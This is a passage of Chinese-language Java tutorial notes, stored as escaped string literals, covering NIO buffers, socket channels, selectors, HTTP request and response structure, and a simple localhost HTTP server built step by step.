byteBuffer.position(1);\n\n  //        limit(int newLimit)\t  修改limit\n  //        byteBuffer.limit(5);\n  //        System.out.println(byteBuffer.position());\n  //        System.out.println(byteBuffer.limit());\n  //        System.out.println(byteBuffer.capacity());\n\n  //        int remaining()\t\t  还有多少能操作\n  //        boolean hasRemaining()\t  是否还有能操作的\n\n          byteBuffer.put("0123456789".getBytes());\n          System.out.println(byteBuffer.remaining());\n          System.out.println(byteBuffer.hasRemaining());\n      }\n  }\n  ```\n\n### 4.6NIO缓冲区获取数据【应用】\n\n+ 方法介绍\n\n  | 方法名              | 介绍                  |\n  | ---------------- | ------------------- |\n  | flip()           | 切换读写模式（写à读）         |\n  | get()            | 读一个字节               |\n  | get(byte[]  dst) | 读多个字节               |\n  | get(int  index)  | 读指定索引的字节            |\n  | rewind()         | 将position设置为0，可以重复读 |\n  | clear()          | 数据读写完毕（读->写）        |\n  | array()          | 将缓冲区转换成字节数组返回       |\n\n+ 代码示例\n\n  ```java\n  public class ByteBufferDemo3 {\n      public static void main(String[] args) {\n          ByteBuffer byteBuffer = ByteBuffer.allocate(10);\n          byteBuffer.put("abc".getBytes());\n\n  //        flip()  切换读写模式（写读）\n          byteBuffer.flip();\n  //        get()   读一个字节\n  //        while(byteBuffer.limit() != byteBuffer.position()){\n  //            System.out.println((char) byteBuffer.get());\n  //        }\n\n          for (int i = 0; i < byteBuffer.limit(); i++) {\n              System.out.println((char) byteBuffer.get());\n          }\n\n  //        get(byte[] dst) 读多个字节\n  //        byte [] bytes = new byte[byteBuffer.limit()];\n  //        byteBuffer.get(bytes);\n  //        System.out.println(new String(bytes));\n\n  //        get(int index)  读指定索引的字节\n  //        System.out.println((char) byteBuffer.get(0));\n\n  //        rewind()    将position设置为0，可以重复读\n  //        byteBuffer.rewind();\n  //        for (int i = 0; i < byteBuffer.limit(); i++) {\n  //            System.out.println((char) byteBuffer.get());\n  //        }\n\n  //        clear()     数据读写完毕（读->写）\n          byteBuffer.clear();\n          byteBuffer.put("qqq".getBytes());\n  //        array()     将缓冲区转换成字节数组返回\n\n          byte[] bytes = byteBuffer.array();\n          System.out.println(new String(bytes));\n      }\n  }\n  ```\n\n### 4.7小结【理解】\n\n1. 需求：我要把数据写到缓冲区中。\n\n   数据是从外面进入到缓冲区的，所以缓冲区在做读数据的操作。\n\n2. 需求：我要把数据从缓冲区中读出来。\n\n   数据是从缓冲区里面到外面的。所以缓冲区在做写数据的操作。\n\n3. capacity：容量（长度）\n   limit：   界限（最多能读/写到哪里）\n   posotion：位置（读/写哪个索引）\n\n4. 获取缓冲区里面数据之前，需要调用flip方法\n\n5. 再次写数据之前，需要调用clear方法，\n\n   但是数据还未消失，等再次写入数据，被覆盖了才会消失。\n\n',$n='## 1.NIO\n\n### 1.1 NIO通道客户端【应用】\n\n+ 客户端实现步骤\n\n  1. 打开通道\n  2. 指定IP和端口号\n  3. 写出数据\n  4. 释放资源\n\n+ 示例代码\n\n  ```java\n  public class NIOClient {\n      public static void main(String[] args) throws IOException {\n          //1.打开通道\n          SocketChannel socketChannel = SocketChannel.open();\n\n          //2.指定IP和端口号\n          socketChannel.connect(new InetSocketAddress("127.0.0.1",10000));\n\n          //3.写出数据\n          ByteBuffer byteBuffer = ByteBuffer.wrap("一点寒毛先制".getBytes());\n          socketChannel.write(byteBuffer);\n\n          //4.释放资源\n          socketChannel.close();\n      }\n  }\n  ```\n\n### 1.2 NIO通道服务端【应用】\n\n+ NIO通道\n\n  + 服务端通道 \n\n    只负责建立建立，不负责传递数据\n\n  + 客户端通道\n\n    建立建立并将数据传递给服务端\n\n  + 缓冲区\n\n    客户端发送的数据都在缓冲区中\n\n  + 服务端通道内部创建出来的客户端通道\n\n    相当于客户端通道的延伸用来传递数据\n\n+ 服务端实现步骤\n\n  1. 打开一个服务端通道\n  2. 绑定对应的端口号\n  3. 通道默认是阻塞的，需要设置为非阻塞\n  4. 此时没有门卫大爷，所以需要经常看一下有没有连接发过来没？\n  5. 如果有客户端来连接了,则在服务端通道内部,再创建一个客户端通道,相当于是客户端通道的延伸\n  6. 获取客户端传递过来的数据,并把数据放在byteBuffer1这个缓冲区中\n  7. 给客户端回写数据\n  8. 释放资源\n\n+ 示例代码\n\n  ```java\n  public class NIOServer {\n      public static void main(String[] args) throws IOException {\n  //        1.打开一个服务端通道\n          ServerSocketChannel serverSocketChannel = ServerSocketChannel.open();\n  //        2.绑定对应的端口号\n          serverSocketChannel.bind(new InetSocketAddress(10000));\n  //        3.通道默认是阻塞的，需要设置为非阻塞\n              //如果传递true 表示通道设置为阻塞通道...默认值\n              //如果传递false 表示通道设置为非阻塞通道\n          serverSocketChannel.configureBlocking(false);\n  //        4.此时没有门卫大爷，所以需要经常看一下有没有连接发过来没？\n          while (true) {\n  //        5.如果有客户端来连接了，则在服务端通道内部，再创建一个客户端通道，相当于是客户端通道的延伸\n              //此时已经设置了通道为非阻塞\n              //所以在调用方法的时候,如果有客户端来连接,那么会创建一个SocketChannel对象.\n              //如果在调用方法的时候,没有客户端来连接,那么他会返回一个null\n              SocketChannel socketChannel = serverSocketChannel.accept();\n              //System.out.println(socketChannel);\n              if(socketChannel != null){\n  //        6.客户端将缓冲区通过通道传递给服务端,就到了这个延伸通道socketChannel里面\n  //        7.服务端创建一个空的缓冲区装数据并输出\n                  ByteBuffer byteBuffer = ByteBuffer.allocate(1024);\n                  //获取传递过来的数据,并把他们放到byteBuffer缓冲区中.\n                  //返回值:\n                      //正数: 表示本次读到的有效字节个数.\n                      //0   : 表示本次没有读到有效字节.\n                      //-1  : 表示读到了末尾\n                  int len = socketChannel.read(byteBuffer);\n                  System.out.println(new String(byteBuffer.array(),0,len));\n                //8.释放资源\n                  socketChannel.close();\n              }\n          }\n      }\n  }\n  ```\n\n### 1.3 NIO通道练习【应用】\n\n+ 客户端\n\n  + 实现步骤\n\n    1. 打开通道\n    2. 指定IP和端口号\n    3. 写出数据\n    4. 读取服务器写回的数据\n    5. 释放资源\n\n  + 示例代码\n\n    ```java\n    public class Clinet {\n        public static void main(String[] args) throws IOException {\n            // 1.打开通道\n            SocketChannel socketChannel = SocketChannel.open();\n            // 2.指定IP和端口号\n            socketChannel.connect(new InetSocketAddress("127.0.0.1",10000));\n            // 3.写出数据\n            ByteBuffer byteBuffer1 = ByteBuffer.wrap("吃俺老孙一棒棒".getBytes());\n            socketChannel.write(byteBuffer1);\n      \t\t// 手动写入结束标记\n            socketChannel.shutdownOutput();\n\n            System.out.println("数据已经写给服务器");\n            // 4.读取服务器写回的数据\n            ByteBuffer byteBuffer2 = ByteBuffer.allocate(1024);\n            int len;\n            while((len = socketChannel.read(byteBuffer2)) != -1){\n                byteBuffer2.flip();\n                System.out.println(new String(byteBuffer2.array(),0,len));\n                byteBuffer2.clear();\n            }\n            // 5.释放资源\n            socketChannel.close();\n        }\n    }\n    ```\n\n+ 服务端\n\n  + 实现步骤\n\n    1. 打开一个服务端通道\n    2. 绑定对应的端口号\n    3. 通道默认是阻塞的，需要设置为非阻塞\n    4. 此时没有门卫大爷，所以需要经常看一下有没有连接发过来没？\n    5. 如果有客户端来连接了,则在服务端通道内部,再创建一个客户端通道,相当于是客户端通道的延伸\n    6. 获取客户端传递过来的数据,并把数据放在byteBuffer1这个缓冲区中\n    7. 给客户端回写数据\n    8. 释放资源\n\n  + 示例代码\n\n    ```java\n    public class Sever {\n        public static void main(String[] args) throws IOException {\n            // 1，打开一个服务端通道\n            ServerSocketChannel serverSocketChannel = ServerSocketChannel.open();\n            // 2，绑定对应的端口号\n            serverSocketChannel.bind(new InetSocketAddress(10000));\n            // 3，通道默认是阻塞的，需要设置为非阻塞\n            serverSocketChannel.configureBlocking(false);\n            // 4，此时没有门卫大爷，所以需要经常看一下有没有连接发过来没？\n            while(true){\n                //  5，如果有客户端来连接了，则在服务端通道内部，再创建一个客户端通道，相当于是客户端通道的延伸\n                SocketChannel socketChannel = serverSocketChannel.accept();\n                if(socketChannel != null){\n                    System.out.println("此时有客户端来连接了");\n                    // 6,获取客户端传递过来的数据,并把数据放在byteBuffer1这个缓冲区中\n                    ByteBuffer byteBuffer1 = ByteBuffer.allocate(1024);\n                    //socketChannel.read(byteBuffer1);\n                    int len;\n                    //针对于缓冲区来讲\n                        //如果 从添加数据 ----\x3e 获取数据 flip\n                        //如果 从获取数据 ----\x3e 添加数据 clear\n                    while((len = socketChannel.read(byteBuffer1)) != -1){\n                        byteBuffer1.flip();\n                        System.out.println(new String(byteBuffer1.array(),0,len));\n                        byteBuffer1.clear();\n                    }\n\n                    System.out.println("接收数据完毕,准备开始往客户端回写数据");\n                    // 7,给客户端回写数据\n                    ByteBuffer byteBuffer2 = ByteBuffer.wrap("哎哟,真疼啊!!!".getBytes());\n                    socketChannel.write(byteBuffer2);\n                    // 8,释放资源\n                    socketChannel.close();\n                }\n            }\n        }\n    }\n    ```\n\n### 1.4 NIO通道练习优化【应用】\n\n+ 存在问题\n\n  服务端内部获取的客户端通道在读取时,如果读取不到结束标记就会一直阻塞\n\n+ 解决方案\n\n  将服务端内部获取的客户端通道设置为非阻塞的\n\n+ 示例代码\n\n  ```java\n  // 客户端\n  public class Clinet {\n      public static void main(String[] args) throws IOException {\n          SocketChannel socketChannel = SocketChannel.open();\n\n          socketChannel.connect(new InetSocketAddress("127.0.0.1",10000));\n\n          ByteBuffer byteBuffer1 = ByteBuffer.wrap("吃俺老孙一棒棒".getBytes());\n          socketChannel.write(byteBuffer1);\n\n          System.out.println("数据已经写给服务器");\n\n          ByteBuffer byteBuffer2 = ByteBuffer.allocate(1024);\n          int len;\n          while((len = socketChannel.read(byteBuffer2)) != -1){\n              System.out.println("客户端接收回写数据");\n              byteBuffer2.flip();\n              System.out.println(new String(byteBuffer2.array(),0,len));\n              byteBuffer2.clear();\n          }\n          socketChannel.close();\n      }\n  }\n  // 服务端\n  public class Sever {\n      public static void main(String[] args) throws IOException {\n          ServerSocketChannel serverSocketChannel = ServerSocketChannel.open();\n\n          serverSocketChannel.bind(new InetSocketAddress(10000));\n\n          serverSocketChannel.configureBlocking(false);\n\n          while(true){\n              SocketChannel socketChannel = serverSocketChannel.accept();\n              if(socketChannel != null){\n                  System.out.println("此时有客户端来连接了");\n                \t// 将服务端内部获取的客户端通道设置为非阻塞的\n                  socketChannel.configureBlocking(false);\n                  //获取客户端传递过来的数据,并把数据放在byteBuffer1这个缓冲区中\n                  ByteBuffer byteBuffer1 = ByteBuffer.allocate(1024);\n                  //socketChannel.read(byteBuffer1);\n                  int len;\n                  //针对于缓冲区来讲\n                      //如果 从添加数据 ----\x3e 获取数据 flip\n                      //如果 从获取数据 ----\x3e 添加数据 clear\n                  while((len = socketChannel.read(byteBuffer1)) > 0){\n                      System.out.println("服务端接收发送数据");\n                      byteBuffer1.flip();\n                      System.out.println(new String(byteBuffer1.array(),0,len));\n                      byteBuffer1.clear();\n                  }\n\n                  System.out.println("接收数据完毕,准备开始往客户端回写数据");\n\n                  ByteBuffer byteBuffer2 = ByteBuffer.wrap("哎哟,真疼啊!!!".getBytes());\n                  socketChannel.write(byteBuffer2);\n\n                  socketChannel.close();\n              }\n          }\n      }\n  }\n  ```\n\n### 1.5NIO选择器【理解】\n\n+ 概述\n\n  选择器可以监视通道的状态,多路复用\n\n  ![02_选择器概述](./img/java/basics/day24-网络编程02.img/02_选择器概述.png)\n\n  ![01_选择器多路复用](./img/java/basics/day24-网络编程02.img/01_选择器多路复用.png)\n\n+ 选择器对象\n\n  + Selector\n\n    选择器对象\n\n  + SelectionKey\n\n    绑定的key\n\n  + SelectableChannel\n\n    能使用选择器的通道\n\n    + SocketChannel\n    + ServerSocketChannel\n\n### 1.6NIO选择器改写服务端【应用】\n\n+ 实现步骤\n\n  1. 打开一个服务端通道(open)\n\n  2. 绑定对应的端口号\n\n  3. 通道默认是阻塞的，需要设置为非阻塞\n\n  4. 打开一个选择器（门卫大爷）\n\n  5. 将选择器绑定服务端通道，并监视服务端是否准备好\n\n  6. 如果有客户端来连接了，大爷会遍历所有的服务端通道，谁准备好了，就让谁来连接\n       连接后，在服务端通道内部，再创建一个客户端延伸通道\n\n  7. 如果客户端把数据传递过来了，大爷会遍历所有的延伸通道，谁准备好了，谁去接收数据\n\n       ![03_选择器改写服务器](./img/java/basics/day24-网络编程02.img/03_选择器改写服务器.png)\n\n+  代码实现\n\n   ```java\n   // 客户端\n   public class Clinet {\n       public static void main(String[] args) throws IOException {\n           SocketChannel socketChannel = SocketChannel.open();\n\n           socketChannel.connect(new InetSocketAddress("127.0.0.1",10000));\n\n           ByteBuffer byteBuffer1 = ByteBuffer.wrap("吃俺老孙一棒棒".getBytes());\n           socketChannel.write(byteBuffer1);\n\n           System.out.println("数据已经写给服务器");\n\n           ByteBuffer byteBuffer2 = ByteBuffer.allocate(1024);\n           int len;\n           while((len = socketChannel.read(byteBuffer2)) != -1){\n               System.out.println("客户端接收回写数据");\n               byteBuffer2.flip();\n               System.out.println(new String(byteBuffer2.array(),0,len));\n               byteBuffer2.clear();\n           }\n           socketChannel.close();\n       }\n   }\n   // 服务端\n   public class Server {\n       public static void main(String[] args) throws IOException {\n           //1.打开服务端通道\n           ServerSocketChannel serverSocketChannel = ServerSocketChannel.open();\n           //2.让这个通道绑定一个端口\n           serverSocketChannel.bind(new InetSocketAddress(10000));\n           //3.设置通道为非阻塞\n           serverSocketChannel.configureBlocking(false);\n           //4.打开一个选择器\n           //Selector --- 选择器\n   //        SelectionKey --- 绑定通道后返回那个令牌\n     //      SelectableChannel --- 可以使用选择器的通道\n           Selector selector = Selector.open();\n           //5.绑定选择器和服务端通道\n           serverSocketChannel.register(selector,SelectionKey.OP_ACCEPT);\n\n           while(true){\n               System.out.println("11");\n               //选择器会监视客户端通道的状态.\n               //6.返回值就表示此时有多少个客户端来连接.\n               int count = selector.select();\n               System.out.println("222");\n               if(count != 0){\n                   System.out.println("有客户端来连接了");\n                   //7.会遍历所有的服务端通道.看谁准备好了,谁准备好了,就让谁去连接.\n                   //获取所有服务端通道的令牌,并将它们都放到一个集合中,将集合返回.\n                   Set<SelectionKey> selectionKeys = selector.selectedKeys();\n                   Iterator<SelectionKey> iterator = selectionKeys.iterator();\n                   while(iterator.hasNext()){\n                       //selectionKey 依次表示每一个服务端通道的令牌\n                       SelectionKey selectionKey = iterator.next();\n                       if(selectionKey.isAcceptable()){\n                           //可以通过令牌来获取到了一个已经就绪的服务端通道\n                           ServerSocketChannel ssc = (ServerSocketChannel) selectionKey.channel();\n                           //客户端的延伸通道\n                           SocketChannel socketChannel = ssc.accept();\n                           //将客户端延伸通道设置为非阻塞的\n                           socketChannel.configureBlocking(false);\n                           socketChannel.register(selector,SelectionKey.OP_READ);\n                           //当客户端来连接的时候,所有的步骤已经全部执行完毕.\n                       }else if(selectionKey.isReadable()){\n                           //当前通道已经做好了读取的准备(延伸通道)\n                           SocketChannel socketChannel = (SocketChannel) selectionKey.channel();\n                           ByteBuffer byteBuffer1 = ByteBuffer.allocate(1024);\n                           //socketChannel.read(byteBuffer1);\n                           int len;\n                           while((len = socketChannel.read(byteBuffer1)) > 0){\n                               byteBuffer1.flip();\n                               System.out.println(new String(byteBuffer1.array(),0,len));\n                               byteBuffer1.clear();\n                           }\n                           //给客户端的回写数据\n                           socketChannel.write(ByteBuffer.wrap("哎哟喂好疼啊!!!".getBytes()));\n                           socketChannel.close();\n                       }\n                       iterator.remove();\n                   }\n               }\n           }\n       }\n   }\n   ```\n\n## 2.HTTP协议\n\n### 2.1概述【理解】\n\n超文本传输协议(关于超文本的概念JavaWeb在进行学习)，是建立在TCP/IP协议基础上,是网络应用层的协议。\n\n由请求和响应构成,是一个标准的客户端和服务器模型\n\n### 2.2URL【理解】\n\n+ 概述\n\n  统一资源定位符,常见的如http://bbs.itheima.com/forum.php\n\n  完整的格式为 http://bbs.itheima.com:80/forum.php\n\n+ 详解\n\n  ![04_url](./img/java/basics/day24-网络编程02.img/04_url.png)\n\n### 2.3抓包工具的使用【应用】\n\n+ 使用步骤\n\n  1. 在谷歌浏览器网页中按F12 或者网页空白处右键,点击检查,可以调出工具\n\n  2. 点击network,进入到查看网络相关信息界面\n\n  3. 这时在浏览器中发起请求,进行访问,工具中就会显示出请求和响应相关的信息\n\n     ![05_抓包](./img/java/basics/day24-网络编程02.img/05_抓包.png)\n\n### 2.4请求信息【理解】\n\n+ 组成\n  + 请求行\n  + 请求头\n  + 请求空行\n  + 请求体\n\n\n+ 请求行\n\n  + 格式\n\n    ![06_请求行格式](./img/java/basics/day24-网络编程02.img/06_请求行格式.png)\n\n  + 请求方式\n\n    GET,POST,HEAD,PUT,DELETE,CONNECT,OPTIONS,TRACE,PATCH\n\n    其中用的比较多的是GET和POST\n\n  + URI\n\n    请求资源路径,统一资源标识符\n\n    ![07_Uri图示](./img/java/basics/day24-网络编程02.img/07_Uri图示.png)\n\n  + 协议版本\n\n    + HTTP1.0: 每次请求和响应都需要建立一个单独的连接\n    + HTTP1.1:支持长连接\n\n+ 请求头\n\n  + 格式\n\n    ![08_请求头图示](./img/java/basics/day24-网络编程02.img/08_请求头图示.png)\n\n  + 请求头名称\n\n    + Host: 用来指定请求的服务端地址\n    + Connection: 取值为keep-alive表示需要持久连接\n    + User-Agent: 客户端的信息\n    + Accept: 指定客户端能够接收的内容类型\n    + Accept-Encoding: 指定浏览器可以支持的服务器返回内容压缩编码类型\n    + Accept-Language: 浏览器可接受的语言\n\n    ![09_请求头示例](./img/java/basics/day24-网络编程02.img/09_请求头示例.png)\n\n+ 小结\n\n  ![10_请求信息小结](./img/java/basics/day24-网络编程02.img/10_请求信息小结.png)\n\n### 2.5响应信息【理解】\n\n+ 组成\n  + 响应行\n  + 响应头\n  + 响应空行\n  + 响应体\n\n\n+ 响应行\n\n  + 格式\n\n    ![11_响应头格式](./img/java/basics/day24-网络编程02.img/11_响应头格式.png)\n\n  + 协议版本\n\n    + HTTP1.0: 每次请求和响应都需要建立一个单独的连接\n    + HTTP1.1: 支持长连接\n\n  + 响应状态码\n\n    + 1xx: 指示信息(表示请求已接收，继续处理)\n    + 2xx: 成功(表示请求已被成功接收、理解、接受)\n    + 3xx: 请求重定向(要完成请求必须进行更进一步的操作)\n    + 4xx: 客户端错误(请求有语法错误或请求无法实现)\n    + 5xx: 服务器端错误(服务器未能实现合法的请求)\n\n  + 状态信息\n\n    + 200 ok\n    + 404 Not Found\n    + 500 Internal Server Error\n\n+ 响应头\n\n  + 响应头名称\n\n    + Content-Type: 告诉客户端实际返回内容的网络媒体类型(互联网媒体类型,也叫做MIME类型)\n\n  + 响应头值\n\n    + text/html ----\x3e 文本类型\n    + image/png ----\x3e png格式文件\n    + image/jpeg ----\x3e jpg格式文件\n\n    ![13_响应头示例](./img/java/basics/day24-网络编程02.img/13_响应头示例.png)\n\n+ 小结\n\n  ![12_响应信息小结](./img/java/basics/day24-网络编程02.img/12_响应信息小结.png)\n\n## 3.HTTP服务器\n\n### 3.1需求【理解】\n\n+ 编写服务器端代码,实现可以解析浏览器的请求,给浏览器响应数据\n\n### 3.2环境搭建【理解】\n\n+ 实现步骤\n  + 编写HttpServer类,实现可以接收浏览器发出的请求\n  + 其中获取连接的代码可以单独抽取到一个类中\n\n+ 代码实现\n\n  ```java\n  // 服务端代码\n  public class HttpServer {\n      public static void main(String[] args) throws IOException {\n          //1.打开服务端通道\n          ServerSocketChannel serverSocketChannel = ServerSocketChannel.open();\n          //2.让这个通道绑定一个端口\n          serverSocketChannel.bind(new InetSocketAddress(10000));\n          //3.设置通道为非阻塞\n          serverSocketChannel.configureBlocking(false);\n          //4.打开一个选择器\n          Selector selector = Selector.open();\n\n          //5.绑定选择器和服务端通道\n          serverSocketChannel.register(selector,SelectionKey.OP_ACCEPT);\n\n          while(true){\n              //6.选择器会监视通道的状态.\n              int count = selector.select();\n              if(count != 0){\n                  //7.会遍历所有的服务端通道.看谁准备好了,谁准备好了,就让谁去连接.\n                  //获取所有服务端通道的令牌,并将它们都放到一个集合中,将集合返回.\n                  Set<SelectionKey> selectionKeys = selector.selectedKeys();\n                  Iterator<SelectionKey> iterator = selectionKeys.iterator();\n                  while(iterator.hasNext()){\n                      //selectionKey 依次表示每一个服务端通道的令牌\n                      SelectionKey selectionKey = iterator.next();\n                      if(selectionKey.isAcceptable()){\n                          //获取连接\n                          AcceptHandler acceptHandler = new AcceptHandler();\n                          acceptHandler.connSocketChannel(selectionKey);\n                      }else if(selectionKey.isReadable()){\n                         \n                      }\n                      //任务处理完毕以后,将SelectionKey从集合中移除\n                      iterator.remove();\n                  }\n              }\n          }\n      }\n  }\n  // 将获取连接的代码抽取到这个类中\n  public class AcceptHandler {\n\n      public SocketChannel connSocketChannel(SelectionKey selectionKey){\n          try {\n              //获取到已经就绪的服务端通道\n              ServerSocketChannel ssc = (ServerSocketChannel) selectionKey.channel();\n              SocketChannel socketChannel = ssc.accept();\n              //设置为非阻塞状态\n              socketChannel.configureBlocking(false);\n              //把socketChannel注册到选择器上\n              socketChannel.register(selectionKey.selector(), SelectionKey.OP_READ);\n              return socketChannel;\n          } catch (IOException e) {\n              e.printStackTrace();\n          }\n          return null;\n      }\n  }\n  ```\n\n### 3.3获取请求信息并解析【理解】\n\n+ 实现步骤\n\n  + 将请求信息封装到HttpRequest类中\n  + 在类中定义方法,实现获取请求信息并解析\n\n+ 代码实现\n\n  ```java\n  /**\n   * 用来封装请求数据的类\n   */\n  public class HttpRequest {\n      private String method; //请求方式\n      private String requestURI; //请求的uri\n      private String version;   //http的协议版本\n\n      private HashMap<String,String> hm = new HashMap<>();//所有的请求头\n\n      //parse --- 获取请求数据 并解析\n      public void parse(SelectionKey selectionKey){\n          try {\n              SocketChannel socketChannel = (SocketChannel) selectionKey.channel();\n\n              StringBuilder sb = new StringBuilder();\n              //创建一个缓冲区\n              ByteBuffer byteBuffer = ByteBuffer.allocate(1024);\n              int len;\n              //循环读取\n              while((len = socketChannel.read(byteBuffer)) > 0){\n                  byteBuffer.flip();\n                  sb.append(new String(byteBuffer.array(),0,len));\n                  //System.out.println(new String(byteBuffer.array(),0,len));\n                  byteBuffer.clear();\n              }\n              //System.out.println(sb);\n              parseHttpRequest(sb);\n\n          } catch (IOException e) {\n              e.printStackTrace();\n          }\n      }\n\n      //解析http请求协议中的数据\n      private void parseHttpRequest(StringBuilder sb) {\n          //1.需要把StringBuilder先变成一个字符串\n          String httpRequestStr = sb.toString();\n          //2.获取每一行数据\n          String[] split = httpRequestStr.split("\\r\\n");\n          //3.获取请求行\n          String httpRequestLine = split[0];//GET / HTTP/1.1\n          //4.按照空格进行切割,得到请求行中的三部分\n          String[] httpRequestInfo = httpRequestLine.split(" ");\n          this.method = httpRequestInfo[0];\n          this.requestURI = httpRequestInfo[1];\n          this.version = httpRequestInfo[2];\n          //5.操作每一个请求头\n          for (int i = 1; i < split.length; i++) {\n              String httpRequestHeaderInfo = split[i];//Host: 127.0.0.1:10000\n              String[] httpRequestHeaderInfoArr = httpRequestHeaderInfo.split(": ");\n              hm.put(httpRequestHeaderInfoArr[0],httpRequestHeaderInfoArr[1]);\n          }\n\n      }\n\n      public String getMethod() {\n          return method;\n      }\n\n      public void setMethod(String method) {\n          this.method = method;\n      }\n\n      public String getRequestURI() {\n          return requestURI;\n      }\n\n      public void setRequestURI(String requestURI) {\n          this.requestURI = requestURI;\n      }\n\n      public String getVersion() {\n          return version;\n      }\n\n      public void setVersion(String version) {\n          this.version = version;\n      }\n\n      public HashMap<String, String> getHm() {\n          return hm;\n      }\n\n      public void setHm(HashMap<String, String> hm) {\n          this.hm = hm;\n      }\n\n      @Override\n      public String toString() {\n          return "HttpRequest{" +\n                  "method=\'" + method + \'\\\'\' +\n                  ", requestURI=\'" + requestURI + \'\\\'\' +\n                  ", version=\'" + version + \'\\\'\' +\n                  ", hm=" + hm +\n                  \'}\';\n      }\n  }\n  ```\n\n### 3.4给浏览器响应数据【理解】\n\n+ 实现步骤\n\n  + 将响应信息封装HttpResponse类中\n  + 定义方法,封装响应信息,给浏览器响应数据\n\n+ 代码实现\n\n  ```java\n  public class HttpResponse {\n      private String version; //协议版本\n      private String status;  //响应状态码\n      private String desc;    //状态码的描述信息\n\n      //响应头数据\n      private HashMap<String, String> hm = new HashMap<>();\n\n      private HttpRequest httpRequest;  //我们后面要根据请求的数据,来进行一些判断\n\n      //给浏览器响应数据的方法\n      public void sendStaticResource(SelectionKey selectionKey) {\n          //1.给响应行赋值\n          this.version = "HTTP/1.1";\n          this.status = "200";\n          this.desc = "ok";\n          //2.将响应行拼接成一个单独的字符串 // HTTP/1.1 200 ok\n          String responseLine = this.version + " " + this.status + " " + this.desc + "\\r\\n";\n\n          //3.给响应头赋值\n          hm.put("Content-Type", "text/html;charset=UTF-8");\n\n          //4.将所有的响应头拼接成一个单独的字符串\n          StringBuilder sb = new StringBuilder();\n          Set<Map.Entry<String, String>> entries = hm.entrySet();\n          for (Map.Entry<String, String> entry : entries) {\n              sb.append(entry.getKey()).append(": ").append(entry.getValue()).append("\\r\\n");\n          }\n\n          //5.响应空行\n          String emptyLine = "\\r\\n";\n\n          //6.响应行,响应头,响应空行拼接成一个大字符串\n          String responseLineStr = responseLine + sb.toString() + emptyLine;\n\n          try {\n              //7.将上面三个写给浏览器\n              SocketChannel socketChannel = (SocketChannel) selectionKey.channel();\n              ByteBuffer byteBuffer1 = ByteBuffer.wrap(responseLineStr.getBytes());\n              socketChannel.write(byteBuffer1);\n\n              //8.单独操作响应体\n              //因为在以后响应体不一定是一个字符串\n              //有可能是一个文件,所以单独操作\n              String s = "哎哟,妈呀,终于写完了.";\n              ByteBuffer byteBuffer2 = ByteBuffer.wrap(s.getBytes());\n              socketChannel.write(byteBuffer2);\n\n              //9.释放资源\n              socketChannel.close();\n          } catch (IOException e) {\n              e.printStackTrace();\n          }\n      }\n\n      public String getVersion() {\n          return version;\n      }\n\n      public void setVersion(String version) {\n          this.version = version;\n      }\n\n      public String getStatus() {\n          return status;\n      }\n\n      public void setStatus(String status) {\n          this.status = status;\n      }\n\n      public String getDesc() {\n          return desc;\n      }\n\n      public void setDesc(String desc) {\n          this.desc = desc;\n      }\n\n      public HashMap<String, String> getHm() {\n          return hm;\n      }\n\n      public void setHm(HashMap<String, String> hm) {\n          this.hm = hm;\n      }\n\n      public HttpRequest getHttpRequest() {\n          return httpRequest;\n      }\n\n      public void setHttpRequest(HttpRequest httpRequest) {\n          this.httpRequest = httpRequest;\n      }\n\n      @Override\n      public String toString() {\n          return "HttpResponse{" +\n                  "version=\'" + version + \'\\\'\' +\n                  ", status=\'" + status + \'\\\'\' +\n                  ", desc=\'" + desc + \'\\\'\' +\n                  ", hm=" + hm +\n                  ", httpRequest=" + httpRequest +\n                  \'}\';\n      }\n  }\n  ```\n\n### 3.5代码优化【理解】\n\n+ 实现步骤\n\n  + 根据请求资源路径不同,响应不同的数据\n  + 服务端健壮性处理\n  + 访问不存在的资源处理\n\n+ 代码实现\n\n  ```java\n  /**\n   * 接收连接的任务处理类\n   */\n  public class AcceptHandler {\n\n      public SocketChannel connSocketChannel(SelectionKey selectionKey){\n          try {\n              //获取到已经就绪的服务端通道\n              ServerSocketChannel ssc = (ServerSocketChannel) selectionKey.channel();\n              SocketChannel socketChannel = ssc.accept();\n              //设置为非阻塞状态\n              socketChannel.configureBlocking(false);\n              //把socketChannel注册到选择器上\n              socketChannel.register(selectionKey.selector(), SelectionKey.OP_READ);\n              return socketChannel;\n          } catch (IOException e) {\n              e.printStackTrace();\n          }\n          return null;\n      }\n  }\n  /**\n   * 接收客户端请求的类\n   */\n  public class HttpServer {\n      public static void main(String[] args) throws IOException {\n          //1.打开服务端通道\n          ServerSocketChannel serverSocketChannel = ServerSocketChannel.open();\n          //2.让这个通道绑定一个端口\n          serverSocketChannel.bind(new InetSocketAddress(10000));\n          //3.设置通道为非阻塞\n          serverSocketChannel.configureBlocking(false);\n          //4.打开一个选择器\n          Selector selector = Selector.open();\n          //5.绑定选择器和服务端通道\n          serverSocketChannel.register(selector,SelectionKey.OP_ACCEPT);\n\n          while(true){\n              //6.选择器会监视通道的状态.\n              int count = selector.select();\n              if(count != 0){\n                  //7.会遍历所有的服务端通道.看谁准备好了,谁准备好了,就让谁去连接.\n                  //获取所有服务端通道的令牌,并将它们都放到一个集合中,将集合返回.\n                  Set<SelectionKey> selectionKeys = selector.selectedKeys();\n                  Iterator<SelectionKey> iterator = selectionKeys.iterator();\n                  while(iterator.hasNext()){\n                      //selectionKey 依次表示每一个服务端通道的令牌\n                      SelectionKey selectionKey = iterator.next();\n                      if(selectionKey.isAcceptable()){\n                          //获取连接\n                          AcceptHandler acceptHandler = new AcceptHandler();\n                          acceptHandler.connSocketChannel(selectionKey);\n\n                      }else if(selectionKey.isReadable()){\n                          //读取数据\n                          HttpRequest httpRequest = new HttpRequest();\n                          httpRequest.parse(selectionKey);\n                          System.out.println("http请求的数据为 ----\x3e" + httpRequest);\n\n                          if(httpRequest.getRequestURI() == null || "".equals(httpRequest.getRequestURI())){\n                              selectionKey.channel();\n                              continue;\n                          }\n                          System.out.println("...数据解析完毕,准备响应数据....");\n\n                          //响应数据\n                          HttpResponse httpResponse = new HttpResponse();\n                          httpResponse.setHttpRequest(httpRequest);\n                          httpResponse.sendStaticResource(selectionKey);\n                      }\n                      //任务处理完毕以后,将SelectionKey从集合中移除\n                      iterator.remove();\n                  }\n              }\n          }\n      }\n  }\n  /**\n   * 用来封装请求数据的类\n   */\n  public class HttpRequest {\n      private String method; //请求方式\n      private String requestURI; //请求的uri\n      private String version;   //http的协议版本\n\n      private HashMap<String,String> hm = new HashMap<>();//所有的请求头\n\n      //parse --- 获取请求数据 并解析\n      public void parse(SelectionKey selectionKey){\n          try {\n              SocketChannel socketChannel = (SocketChannel) 